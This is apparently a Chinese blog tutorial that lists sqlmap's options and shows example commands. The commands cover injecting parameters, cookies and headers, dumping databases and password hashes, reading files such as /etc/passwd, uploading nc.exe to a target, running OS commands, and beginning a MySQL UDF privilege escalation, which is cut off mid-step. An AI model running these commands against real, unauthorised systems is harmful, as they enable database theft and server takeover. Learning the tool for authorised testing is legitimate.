<p>官方网站：<a href="https://sqlmap.org/">https://sqlmap.org/</a></p>
<p>下载地址：<a href="https://github.com/sqlmapproject/sqlmap">https://github.com/sqlmapproject/sqlmap</a></p>
<h2 id="sqlmap使用参数详解"><a href="#sqlmap使用参数详解" class="headerlink" title="sqlmap使用参数详解"></a>sqlmap使用参数详解</h2><p>本文以sqlmap 1.1.8-8版本为例，对其所有参数进行详细的分析和讲解，便于在使用时进行查询。</p>
<p>用法: <code>sqlmap.py [选项]</code></p>
<h3 id="选项"><a href="#选项" class="headerlink" title="选项"></a>选项</h3><ul>
<li><p>-h，—help： 显示基本帮助信息并退出</p>
</li>
<li><p>-hh： 显示高级帮助信息并退出</p>
</li>
<li><p>—version： 显示程序版本信息并退出</p>
</li>
<li><p>-v VERBOSE信息级别： 0-6 （缺省1），其值具体含义如下：</p>
<ul>
<li>0 只显示python错误以及严重的信息；</li>
<li>1 同时显示基本信息和警告信息（默认）；</li>
<li>2 同时显示debug信息；</li>
<li>3 同时显示注入的payload；</li>
<li>4 同时显示HTTP请求；</li>
<li>5 同时显示HTTP响应头；</li>
<li>6 同时显示HTTP响应页面；</li>
</ul>
<p>如果想看到sqlmap发送的测试payload最好的等级就是3。</p>
</li>
</ul>
<h3 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h3><p>在这些选项中必须提供至少有一个确定目标</p>
<ul>
<li>-d DIRECT： 直接连接数据库的连接字符串</li>
<li>-u URL，—url=URL： 目标URL (如”<a href="http://www.site.com/vuln.php?id=1&quot;)，使用-u或者--url">http://www.site.com/vuln.php?id=1&quot;)，使用-u或者--url</a> </li>
<li>-l LOGFILE： 从Burp或者WebScarab代理日志文件中分析目标</li>
<li>-x SITEMAPURL： 从远程网站地图（sitemap.xml）文件来解析目标</li>
<li>-m BULKFILE： 将目标地址保存在文件中，一行为一个URL地址进行批量检测</li>
<li>-r REQUESTFILE： 从文件加载HTTP请求，sqlmap可以从一个文本文件中获取HTTP请求，这样就可以跳过设置一些其他参数（比如Cookie，POST数据，等等），请求是HTTPS的时需要配合这个—force-ssl参数来使用，或者可以在Host头后面加上:443</li>
<li>-g GOOGLEDORK： 从谷歌中加载结果目标URL（只获取前100个结果，需要挂代理）</li>
<li>-c CONFIGFILE： 从配置ini文件中加载选项</li>
</ul>
<h3 id="请求"><a href="#请求" class="headerlink" title="请求"></a>请求</h3><p>以下选项可以用来指定如何连接到目标URL。</p>
<ul>
<li><p>—method=METHOD： 强制使用给定的HTTP方法（例如put）</p>
</li>
<li><p>—data=DATA： 通过POST发送数据参数，sqlmap会像检测GET参数一样检测POST的参数。</p>
<p>—data=”id=1” -f —banner —dbs —users</p>
</li>
<li><p>—param-del=PARA.. 当GET或POST的数据需要用其他字符分割测试参数的时候需要用到此参数。</p>
</li>
<li><p>—cookie=COOKIE： HTTP Cookie header 值</p>
</li>
<li><p>—cookie-del=COO： 用来分隔cookie的字符串值</p>
</li>
<li><p>—load-cookies=L： Filecontaining cookies in Netscape/wget format</p>
</li>
<li><p>—drop-set-cookie： IgnoreSet-Cookie header from response</p>
</li>
<li><p>—user-agent=AGENT： 默认情况下sqlmap的HTTP请求头中User-Agent值是：sqlmap/1.0-dev-xxxxxxx(<a href="http://sqlmap.org/">http://sqlmap.org</a>)可以使用—user-agent参数来修改，同时也可以使用—random-agent参数来随机的从./txt/user-agents.txt中获取。当—level参数设定为3或者3以上的时候，会尝试对User-Angent进行注入</p>
</li>
<li><p>—random-agent： 使用random-agent作为HTTP User-Agent头值</p>
</li>
<li><p>—host=HOST： HTTP Hostheader value</p>
</li>
<li><p>—referer=REFERER： sqlmap可以在请求中伪造HTTP中的referer，当—level参数设定为3或者3以上的时候会尝试对referer注入</p>
</li>
<li><p>-H HEADER, —hea： 额外的http头(如”X-Forwarded-For: 127.0.0.1”)</p>
</li>
<li><p>—headers=HEADERS： 可以通过—headers参数来增加额外的http头(如”Accept-Language: fr\nETag: 123”)</p>
</li>
<li><p>—auth-type=AUTH： HTTP的认证类型 (Basic, Digest, NTLM or PKI)</p>
</li>
<li><p>—auth-cred=AUTH： HTTP 认证凭证(name:password)</p>
</li>
<li><p>—auth-file=AUTH： HTTP 认证PEM证书/私钥文件；当Web服务器需要客户端证书进行身份验证时，需要提供两个文件:key_file，cert_file,key_file是格式为PEM文件，包含着你的私钥，cert_file是格式为PEM的连接文件。</p>
</li>
<li><p>—ignore-401： Ignore HTTPError 401 (Unauthorized)忽略HTTP 401错误（未授权的）</p>
</li>
<li><p>—ignore-proxy： 忽略系统的默认代理设置</p>
</li>
<li><p>—ignore-redirects： 忽略重定向的尝试</p>
</li>
<li><p>—ignore-timeouts： 忽略连接超时</p>
</li>
<li><p>—proxy=PROXY： 使用代理服务器连接到目标URL</p>
</li>
<li><p>—proxy-cred=PRO： 代理认证凭证(name:password)</p>
</li>
<li><p>—proxy-file=PRO：从文件加载代理列表</p>
</li>
<li><p>—tor： 使用Tor匿名网络</p>
</li>
<li><p>—tor-port=TORPORT： 设置Tor代理端口</p>
</li>
<li><p>—tor-type=TORTYPE： 设置Tor代理类型 (HTTP,SOCKS4 or SOCKS5 (缺省))</p>
</li>
<li><p>—check-tor： 检查Tor的是否正确使用</p>
</li>
<li><p>—delay=DELAY： 可以设定两个HTTP(S)请求间的延迟，设定为0.5的时候是半秒，默认是没有延迟的。</p>
</li>
<li><p>—timeout=TIMEOUT： 可以设定一个HTTP(S)请求超过多久判定为超时，10表示10秒，默认是30秒。</p>
</li>
<li><p>—retries=RETRIES： 当HTTP(S)超时时，可以设定重新尝试连接次数，默认是3次。</p>
</li>
<li><p>—randomize=RPARAM： 可以设定某一个参数值在每一次请求中随机的变化，长度和类型会与提供的初始值一样</p>
</li>
<li><p>—safe-url=SAFEURL： 提供一个安全不错误的连接，每隔一段时间都会去访问一下</p>
</li>
<li><p>—safe-post=SAFE： 提供一个安全不错误的连接，每次测试请求之后都会再访问一遍安全连接。</p>
</li>
<li><p>—safe-req=SAFER： 从文件中加载安全HTTP请求</p>
</li>
<li><p>—safe-freq=SAFE： 测试一个给定安全网址的两个访问请求</p>
</li>
<li><p>—skip-urlencode： 跳过URL的有效载荷数据编码</p>
</li>
<li><p>—csrf-token=CSR： 用来保存反CSRF令牌</p>
</li>
<li><p>—csrf-url=CSRFURL： URL地址访问提取anti-CSRF令牌</p>
</li>
<li><p>—force-ssl： 强制使用SSL/HTTPS</p>
</li>
<li><p>—hpp： 使用HTTP参数污染的方法</p>
</li>
<li><p>—eval=EVALCODE： 在有些时候，需要根据某个参数的变化，而修改另个一参数，才能形成正常的请求，这时可以用—eval参数在每次请求时根据所写python代码做完修改后请求。(e.g “import hashlib;id2=hashlib.md5(id).hexdigest()”)</p>
</li>
</ul>
<p>使用示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u&quot;http://www.target.com/vuln.php?id=1&amp;hash=c4ca4238a0b923820dcc509a6f75849b&quot;--eval=&quot;import hashlib;hash=hashlib.md5(id).hexdigest()&quot;</span><br></pre></td></tr></table></figure>
<h3 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h3><p>这些选项可用于优化sqlmap性能。</p>
<ul>
<li>-o： 打开所有的优化开关</li>
<li>—predict-output： 预测普通查询输出</li>
<li>—keep-alive： 使用持久HTTP（S）连接</li>
<li>—null-connection： 获取页面长度</li>
<li>—threads=THREADS： 当前http(s)最大请求数 (默认 1)</li>
</ul>
<h3 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h3><p>这些选项可用于指定要测试的参数、提供自定义注入有效载荷和可选的篡改脚本。</p>
<ul>
<li>-p TESTPARAMETER： 可测试的参数</li>
<li>—skip=SKIP： 跳过对给定参数的测试</li>
<li>—skip-static： 跳过测试不显示为动态的参数</li>
<li>—param-exclude=： 使用正则表达式排除参数进行测试（如”ses”）</li>
<li>—dbms=DBMS： 强制后端的DBMS为此值</li>
<li>—dbms-cred=DBMS： DBMS认证凭证(user:password)</li>
<li>—os=OS： 强制后端的DBMS操作系统为这个值</li>
<li>—invalid-bignum： 使用大数字使值无效</li>
<li>—invalid-logical： 使用逻辑操作使值无效</li>
<li>—invalid-string： 使用随机字符串使值无效</li>
<li>—no-cast： 关闭有效载荷铸造机制</li>
<li>—no-escape： 关闭字符串逃逸机制</li>
<li>—prefix=PREFIX： 注入payload字符串前缀</li>
<li>—suffix=SUFFIX： 注入payload字符串后缀</li>
<li>—tamper=TAMPER： 使用给定的脚本篡改注入数据</li>
</ul>
<h3 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h3><p>这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容</p>
<ul>
<li>—level=LEVEL： 执行测试的等级（1-5，默认为1）</li>
<li>—risk=RISK： 执行测试的风险（0-3，默认为1）</li>
<li>—string=STRING： 查询时有效时在页面匹配字符串</li>
<li>—not-string=NOT： 当查询求值为无效时匹配的字符串</li>
<li>—regexp=REGEXP： 查询时有效时在页面匹配正则表达式</li>
<li>—code=CODE： 当查询求值为True时匹配的HTTP代码</li>
<li>—text-only： 仅基于在文本内容比较网页</li>
<li>—titles： 仅根据他们的标题进行比较</li>
</ul>
<h3 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h3><p> 这些选项可用于调整具体的SQL注入测试。</p>
<ul>
<li>—technique=TECH： SQL注入技术测试（默认BEUST）<ul>
<li>B： Boolean-based blind（布尔型盲注）</li>
<li>E： Error-based （报错型注入）</li>
<li>U： Union query-based（联合查询注入）</li>
<li>S： Stacked queries（多语句查询注入）</li>
<li>T：Time-based blind（时间型盲注）</li>
<li>Q： Inline queries（嵌套查询注入）</li>
</ul>
</li>
<li>—time-sec=TIMESEC： DBMS响应的延迟时间（默认为5秒）</li>
<li>—union-cols=UCOLS： 定列范围用于测试UNION查询注入</li>
<li>—union-char=UCHAR： 暴力猜测列的字符数</li>
<li>—union-from=UFROM： SQL注入UNION查询使用的格式</li>
<li>—dns-domain=DNS： DNS泄露攻击使用的域名</li>
<li>—second-order=S： URL搜索产生的结果页面</li>
</ul>
<h3 id="指纹"><a href="#指纹" class="headerlink" title="指纹"></a>指纹</h3><ul>
<li>-f，—fingerprint： 执行广泛的DBMS版本指纹检查</li>
</ul>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>以下选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行自定义的SQL语句。</p>
<ul>
<li>-a，—all： 获取所有信息</li>
<li>-b，—banner： 获取数据库管理系统的标识</li>
<li>—current-user： 获取数据库管理系统当前用户</li>
<li>—current-db： 获取数据库管理系统当前数据库</li>
<li>—hostname： 获取数据库服务器的主机名称</li>
<li>—is-dba： 检测DBMS当前用户是否DBA</li>
<li>—users： 枚举数据库管理系统用户</li>
<li>—passwords： 枚举数据库管理系统用户密码哈希</li>
<li>—privileges： 枚举数据库管理系统用户的权限</li>
<li>—roles： 枚举数据库管理系统用户的角色</li>
<li>—dbs： 枚举数据库管理系统数据库</li>
<li>—tables： 枚举的DBMS数据库中的表</li>
<li>—columns： 枚举DBMS数据库表列</li>
<li>—schema： 枚举数据库架构</li>
<li>—count： 检索表的项目数，有时候用户只想获取表中的数据个数而不是具体的内容，那么就可以使用这个参数：sqlmap.py -u url —count -D testdb</li>
<li>—dump： 转储数据库表项</li>
<li>—dump-all： 转储数据库所有表项</li>
<li>—search： 搜索列（S），表（S）和/或数据库名称（S）</li>
<li>—comments： 获取DBMS注释</li>
<li>-D DB： 要进行枚举的指定数据库名</li>
<li>-T TBL： DBMS数据库表枚举</li>
<li>-C COL： DBMS数据库表列枚举</li>
<li>-X EXCLUDECOL： DBMS数据库表不进行枚举</li>
<li>-U USER： 用来进行枚举的数据库用户</li>
<li>—exclude-sysdbs： 枚举表时排除系统数据库</li>
<li>—pivot-column=P： Pivot columnname</li>
<li>—where=DUMPWHERE： Use WHEREcondition while table dumping</li>
<li>—start=LIMITSTART： 获取第一个查询输出数据位置</li>
<li>—stop=LIMITSTOP： 获取最后查询的输出数据</li>
<li>—first=FIRSTCHAR： 第一个查询输出字的字符获取</li>
<li>—last=LASTCHAR： 最后查询的输出字字符获取</li>
<li>—sql-query=QUERY： 要执行的SQL语句</li>
<li>—sql-shell： 提示交互式SQL的shell</li>
<li>—sql-file=SQLFILE： 要执行的SQL文件</li>
</ul>
<h3 id="暴力"><a href="#暴力" class="headerlink" title="暴力"></a>暴力</h3><p>以下选项可以被用来运行暴力检查。</p>
<ul>
<li>—common-tables   检查存在共同表</li>
<li>—common-columns  检查存在共同列</li>
</ul>
<h3 id="用户自定义函数注入"><a href="#用户自定义函数注入" class="headerlink" title="用户自定义函数注入"></a>用户自定义函数注入</h3><p>以下选项可以用来创建用户自定义函数。</p>
<ul>
<li>—udf-inject： 注入用户自定义函数</li>
<li>—shared-lib=SHLIB： 共享库的本地路径</li>
</ul>
<h3 id="访问文件系统"><a href="#访问文件系统" class="headerlink" title="访问文件系统"></a>访问文件系统</h3><p>以下选项可以被用来访问后端数据库管理系统的底层文件系统。</p>
<ul>
<li><p>—file-read=RFILE： 从后端的数据库管理系统文件系统读取文件，SQL Server2005中读取二进制文件example.exe：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u&quot;http://192.168.136.129/sqlmap/mssql/iis/get_str2.asp?name=luther&quot;--file-read &quot;C:/example.exe&quot; -v 1</span><br></pre></td></tr></table></figure>
</li>
<li><p>—file-write=WFILE： 编辑后端的数据库管理系统文件系统上的本地文件</p>
</li>
<li><p>—file-dest=DFILE： 后端的数据库管理系统写入文件的绝对路径</p>
<p>在kali中将/software/nc.exe文件上传到C:/WINDOWS/Temp下： </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u&quot;http://192.168.136.129/sqlmap/mysql/get_int.aspx?id=1&quot; --file-write&quot;/software/nc.exe&quot; --file-dest &quot;C:/WINDOWS/Temp/nc.exe&quot; -v1</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="操作系统访问"><a href="#操作系统访问" class="headerlink" title="操作系统访问"></a>操作系统访问</h3><p>以下选项可以用于访问后端数据库管理系统的底层操作系统。</p>
<ul>
<li>—os-cmd=OSCMD： 执行操作系统命令（OSCMD）</li>
<li>—os-shell： 交互式的操作系统的shell</li>
<li>—os-pwn： 获取一个OOB shell，meterpreter或VNC</li>
<li>—os-smbrelay： 一键获取一个OOBshell，meterpreter或VNC</li>
<li>—os-bof： 存储过程缓冲区溢出利用</li>
<li>—priv-esc： 数据库进程用户权限提升</li>
<li>—msf-path=MSFPATH： MetasploitFramework本地的安装路径</li>
<li>—tmp-path=TMPPATH： 远程临时文件目录的绝对路径</li>
</ul>
<p>使用示例：linux查看当前用户命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u&quot;http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1&quot; --os-cmd id -v1</span><br></pre></td></tr></table></figure>
<h3 id="Windows注册表访问"><a href="#Windows注册表访问" class="headerlink" title="Windows注册表访问"></a>Windows注册表访问</h3><p>以下选项可以被用来访问后端数据库管理系统Windows注册表。</p>
<ul>
<li>—reg-read： 读一个Windows注册表项值</li>
<li>—reg-add： 写一个Windows注册表项值数据</li>
<li>—reg-del： 删除Windows注册表键值</li>
<li>—reg-key=REGKEY： Windows注册表键</li>
<li>—reg-value=REGVAL： Windows注册表项值</li>
<li>—reg-data=REGDATA： Windows注册表键值数据</li>
<li>—reg-type=REGTYPE： Windows注册表项值类型</li>
</ul>
<h3 id="一般选项"><a href="#一般选项" class="headerlink" title="一般选项"></a>一般选项</h3><p>以下选项可以用来设置一些一般的工作参数。</p>
<ul>
<li><p>-s SESSIONFILE： 保存和恢复检索会话文件的所有数据</p>
</li>
<li><p>-t TRAFFICFILE： 记录所有HTTP流量到一个文本文件中</p>
</li>
<li><p>—batch： 从不询问用户输入，使用所有默认配置。</p>
</li>
<li><p>—binary-fields=： 结果字段具有二进制值(如”digest”)</p>
</li>
<li><p>—charset=CHARSET： 强制字符编码</p>
</li>
<li><p>—crawl=CRAWLDEPTH： 从目标URL爬行网站</p>
</li>
<li><p>—crawl-exclude=： 正则表达式从爬行页中排除</p>
</li>
<li><p>—csv-del=CSVDEL： 限定使用CSV输出 (default”,”)</p>
</li>
<li><p>—dump-format=DU： 转储数据格式(CSV(default), HTML or SQLITE)</p>
</li>
<li><p>—eta： 显示每个输出的预计到达时间</p>
</li>
<li><p>—flush-session： 刷新当前目标的会话文件</p>
</li>
<li><p>—forms： 解析和测试目标URL表单</p>
</li>
<li><p>—fresh-queries： 忽略在会话文件中存储的查询结果</p>
</li>
<li><p>—hex： 使用DBMS Hex函数数据检索</p>
</li>
<li><p>—output-dir=OUT： 自定义输出目录路径</p>
</li>
<li>—parse-errors： 解析和显示响应数据库错误信息</li>
<li><p>—save=SAVECONFIG： 保存选项到INI配置文件</p>
</li>
<li><p>—scope=SCOPE： 从提供的代理日志中使用正则表达式过滤目标</p>
</li>
<li><p>—test-filter=TE： 选择测试的有效载荷和/或标题(如 ROW)</p>
</li>
<li>—test-skip=TEST： 跳过试验载荷和/或标题(如 BENCHMARK)</li>
<li>—update： 更新sqlmap</li>
</ul>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ul>
<li>-z： MNEMONICS使用短记忆法 (如”flu,bat,ban,tec=EU”)</li>
<li><p>—alert=ALERT： 发现SQL注入时，运行主机操作系统命令</p>
</li>
<li><p>—answers=ANSWERS： 当希望sqlmap提出输入时，自动输入自己想要的答案(如 “quit=N,follow=N”)，例如：sqlmap.py -u”<a href="http://192.168.22.128/get_int.php?id=1&quot;--technique=E--answers=&quot;extending=N">http://192.168.22.128/get_int.php?id=1&quot;--technique=E--answers=&quot;extending=N</a>“ —batch</p>
</li>
<li>—beep： 发现sql注入时，发出蜂鸣声。</li>
<li>—cleanup： 清除sqlmap注入时在DBMS中产生的udf与表。</li>
<li>—dependencies： 在某些特殊情况下，sqlmap需要独立安装额外的第三方库（例如，选项-d直接连接数据库，开关—os-pwn使用icmpsh隧道，选项 —auth-type 对于NTLM类型的HTTP认证等），只在这种特殊情况下会警告用户。不过，如果想独立检查所有额外的第三方库依赖关系，可以使用开关 —dependcies。</li>
<li>—disable-coloring： 默认彩色输出，禁掉彩色输出。</li>
<li><p>—gpage=GOOGLEPAGE: 使用前100个URL地址作为注入测试，结合此选项，可以指定页面的URL测试</p>
</li>
<li><p>—identify-waf： 进行WAF/IPS/IDS保护测试，目前大约支持30种产品的识别</p>
</li>
<li><p>—mobile： 有时服务端只接收移动端的访问，此时可以设定一个手机的User-Agent来模仿手机登陆。</p>
</li>
<li><p>—offlineWork： 在离线模式下工作</p>
</li>
<li><p>—purge-output： 从输出目录安全删除所有内容，有时需要删除结果文件，而不被恢复，可以使用此参数，原有文件将会被随机的一些文件覆盖。</p>
</li>
<li><p>—skip-waf： 跳过WAF/IPS/IDS启发式检测保护</p>
</li>
<li><p>—smart： 进行积极的启发式测试，快速判断为注入的报错点进行注入</p>
</li>
<li><p>—sqlmap-shell： 互动提示一个sqlmapshell</p>
</li>
<li><p>—tmp-dir=TMPDIR： 用于存储临时文件的本地目录</p>
</li>
<li><p>—web-root=WEBROOT： Web服务器的文档根目录(如”/var/www”)</p>
</li>
<li>—wizard： 新手用户简单的向导使用，可以一步一步教你如何输入针对目标注入</li>
</ul>
<h2 id="sqlmap使用实例"><a href="#sqlmap使用实例" class="headerlink" title="sqlmap使用实例"></a>sqlmap使用实例</h2><h3 id="GET注入自动检测"><a href="#GET注入自动检测" class="headerlink" title="GET注入自动检测"></a>GET注入自动检测</h3><p>检测语法：<code>sqlmap -u &quot;http://hackrock.com:811/Less-1/index.php?id=1&quot; --dbs</code></p>
<p>技巧：在实际检测过程中，sqlmap会不停的询问，需要手工输入<code>Y/N</code>来进行下一步操作，可以使用参数<code>--batch</code>命令来自动答复和判断。</p>
<h3 id="POST注入自动检测"><a href="#POST注入自动检测" class="headerlink" title="POST注入自动检测"></a>POST注入自动检测</h3><h4 id="方式一：日志文件加载"><a href="#方式一：日志文件加载" class="headerlink" title="方式一：日志文件加载"></a>方式一：日志文件加载</h4><blockquote>
<ul>
<li>-l LOGFILE： 从Burp或者WebScarab代理日志文件中分析目标</li>
</ul>
</blockquote>
<p>将BurpSuit抓包到的request请求内容复制到一个文本文件然后改名为<code>.log</code>后缀名的文件如下所示，然后进行注入。</p>
<p><img src="https://i.loli.net/2021/11/02/asi7vI4XMpft3l9.png" alt="image-20211102220949167"></p>
<p>sqlmap注入获取数据库信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -l test.log --dbs</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/11/02/Vhy1wXULeIModjZ.png" alt="image-20211102221208611"></p>
<h4 id="方式二：文本文件加载"><a href="#方式二：文本文件加载" class="headerlink" title="方式二：文本文件加载"></a>方式二：文本文件加载</h4><blockquote>
<ul>
<li><p>-r REQUESTFILE： 从文件加载HTTP请求，sqlmap可以从一个文本文件中获取HTTP请求，这样就可以跳过设置一些其他参数（比如Cookie，POST数据，等等），请求是HTTPS的时需要配合这个—force-ssl参数来使用，或者可以在Host头后面加上:443</p>
</li>
<li><p>-p TESTPARAMETER： 可测试的参数</p>
</li>
</ul>
</blockquote>
<p>将BurpSuit抓包到的request请求内容复制到一个文本文件，然后进行注入。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -r test.txt -p id --dbs</span><br></pre></td></tr></table></figure>
<h4 id="方法三：自动搜索表单"><a href="#方法三：自动搜索表单" class="headerlink" title="方法三：自动搜索表单"></a>方法三：自动搜索表单</h4><blockquote>
<ul>
<li>—forms： 解析和测试目标URL表单</li>
</ul>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://hackrock.com:815/vul/sqli/sqli_id.php&quot; --forms --dbs</span><br></pre></td></tr></table></figure>
<h4 id="方法四：指定数据参数"><a href="#方法四：指定数据参数" class="headerlink" title="方法四：指定数据参数"></a>方法四：指定数据参数</h4><blockquote>
<ul>
<li>—data=DATA： 通过POST发送数据参数，sqlmap会像检测GET参数一样检测POST的参数。</li>
</ul>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://hackrock.com:815/vul/sqli/sqli_id.php&quot; --data=&quot;id=1&quot; --dbs</span><br></pre></td></tr></table></figure>
<h3 id="HTTP头部注入自动检测"><a href="#HTTP头部注入自动检测" class="headerlink" title="HTTP头部注入自动检测"></a>HTTP头部注入自动检测</h3><p>使用参数-u后接网站的url用于明确使用sqlmap进行sql注入的网址。使用参数—cookie，指定cookie内容是”uname=abc”。 </p>
<p>参数—level共有五个等级，默认为1，sqlmap使用的payload可以在xml/payloads.xml中看到，你也可以根据相应的格式添加自己的payload。这个参数不仅影响使用哪些payload同时也会影响测试的注入点，GET和POST的数据都会测试，<strong>HTTP Cookie在level为2的时候就会测试，HTTP User-Agent/Referer头在level为3的时候就会测试。</strong></p>
<h4 id="Cookie头部注入"><a href="#Cookie头部注入" class="headerlink" title="Cookie头部注入"></a>Cookie头部注入</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://hackrock.com:811/Less-20/index.php&quot; --cookie &quot;uname=abc&quot; --dbs --level 2</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/11/03/AUJmi1QP73TnOVy.png" alt="image-20211103130542625"></p>
<h4 id="其他头部注入"><a href="#其他头部注入" class="headerlink" title="其他头部注入"></a>其他头部注入</h4><p>将BurpSuit抓包到的request请求内容复制到一个文本文件。在可能存在注入的http头部加上（*）星号。</p>
<p><img src="https://i.loli.net/2021/11/03/BtedTRKru1pXm4E.png" alt="image-20211103165518726"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -r less18.txt --dbs</span><br></pre></td></tr></table></figure>
<h3 id="批量自动化检测"><a href="#批量自动化检测" class="headerlink" title="批量自动化检测"></a>批量自动化检测</h3><p>可以使用谷歌语法将可能存在注入URL写入到文本文件中，使用sqlmap进行批量检测。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -m test.txt --batch --random-agent</span><br></pre></td></tr></table></figure>
<p>使用Google语法进行URL采集工具可以参考我写的一个脚本：<a href="https://github.com/UlyssesTakusen/CaiJiEngine">https://github.com/UlyssesTakusen/CaiJiEngine</a></p>
<h3 id="数据库的相关操作"><a href="#数据库的相关操作" class="headerlink" title="数据库的相关操作"></a>数据库的相关操作</h3><ul>
<li><p>列数据库信息： —dbs</p>
</li>
<li><p>web当前使用的数据库： —current-db</p>
</li>
<li><p>web数据库使用账户： —current-user</p>
</li>
<li><p>列出sqlserver所有用户： —users</p>
</li>
<li><p>数据库账户与密码： —passwords</p>
</li>
<li><p>指定库名列出所有表：  -D database —tables</p>
<p>-D：指定数据库名称</p>
</li>
<li><p>指定库名表名列出所有字段： <code>-D db_test -T tb_test --columns</code></p>
<p>-T：指定要列出字段的表</p>
</li>
<li><p>指定库名表名字段dump出指定字段：</p>
<p><code>-D db_test -T tb_test --columns -C  id,password,username --dump</code></p>
<p><code>-D db_test -T tb_test --columns -C &quot;id,password,username&quot; --dump</code></p>
<p>可加双引号，也可不加双引号。</p>
</li>
<li><p>导出多少条数据：</p>
<p><code>-D db_test -T tb_test --columns -C &quot;id,password,username&quot; --start 1 --stop 10 --dump</code></p>
<p>参数：</p>
<ul>
<li>—start： 指定开始的行</li>
<li>—stop： 指定结束的行</li>
</ul>
<p>此条命令的含义为： 导出数据库db_test中的表tb_test中的字段(id,password,username)中的第1到第10行的数据内容。</p>
</li>
</ul>
<h3 id="直接连接数据库"><a href="#直接连接数据库" class="headerlink" title="直接连接数据库"></a>直接连接数据库</h3><p>sqlmap直接连接数据库的命令如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -d &quot;mysql://root:Admin123@192.168.21.17:3306/testdb&quot; -f --banner --dbs --users</span><br></pre></td></tr></table></figure>
<p>注：root为数据库账户；Admin123为数据库密码</p>
<h3 id="其它操作"><a href="#其它操作" class="headerlink" title="其它操作"></a>其它操作</h3><h4 id="列举并破解密码哈希值"><a href="#列举并破解密码哈希值" class="headerlink" title="列举并破解密码哈希值"></a>列举并破解密码哈希值</h4><p>  当前用户有权限读取包含用户密码的权限时，sqlmap会现列举出用户，然后列出hash，并尝试破解。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u&quot;http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1&quot; --passwords -v 1</span><br></pre></td></tr></table></figure>
<h4 id="获取表中的数据个数"><a href="#获取表中的数据个数" class="headerlink" title="获取表中的数据个数"></a>获取表中的数据个数</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1&quot; --count -D testdb</span><br></pre></td></tr></table></figure>
<h4 id="对网站进行漏洞爬取"><a href="#对网站进行漏洞爬取" class="headerlink" title="对网站进行漏洞爬取"></a>对网站进行漏洞爬取</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://www.secbang.com&quot; --batch --crawl=3</span><br></pre></td></tr></table></figure>
<h4 id="使用hex避免字符编码导致数据丢失"><a href="#使用hex避免字符编码导致数据丢失" class="headerlink" title="使用hex避免字符编码导致数据丢失"></a>使用hex避免字符编码导致数据丢失</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.48.130/pgsql/get_int.php?id=1&quot; --banner --hex -v 3 --parse-errors</span><br></pre></td></tr></table></figure>
<h4 id="时间型盲注自定义延时"><a href="#时间型盲注自定义延时" class="headerlink" title="时间型盲注自定义延时"></a>时间型盲注自定义延时</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://www.target.com/vuln.php?id=1&quot; --technique T --time-sec=3</span><br></pre></td></tr></table></figure>
<h4 id="模拟测试手机环境站点"><a href="#模拟测试手机环境站点" class="headerlink" title="模拟测试手机环境站点"></a>模拟测试手机环境站点</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://www.target.com/vuln.php?id=1&quot; --mobile</span><br></pre></td></tr></table></figure>
<h4 id="智能判断测试"><a href="#智能判断测试" class="headerlink" title="智能判断测试"></a>智能判断测试</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://www.antian365.com/info.php?id=1&quot;--batch --smart</span><br></pre></td></tr></table></figure>
<h4 id="读取系统文件"><a href="#读取系统文件" class="headerlink" title="读取系统文件"></a>读取系统文件</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u &quot;http://www.target.com/vuln.php?id=1&quot; --file /etc/password</span><br></pre></td></tr></table></figure>
<h4 id="MySQL提权"><a href="#MySQL提权" class="headerlink" title="MySQL提权"></a>MySQL提权</h4><ol>
<li><p>首先需要对动态链接库进行解码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/share/sqlmap/extra/cloak/</span><br><span class="line"></span><br><span class="line">python cloak.py -d -i /usr/share/sqlmap/data/udf/mysql/windows/32/lib_mysqludf_sys.dll_ -o /root/temp/lib_mysqludf_sys.dll</span><br></pre></td></tr></table></figure>
</li>
</ol>
<ol>
<li><p>连接MySQL数据库打开一个交互式Shell：</p>
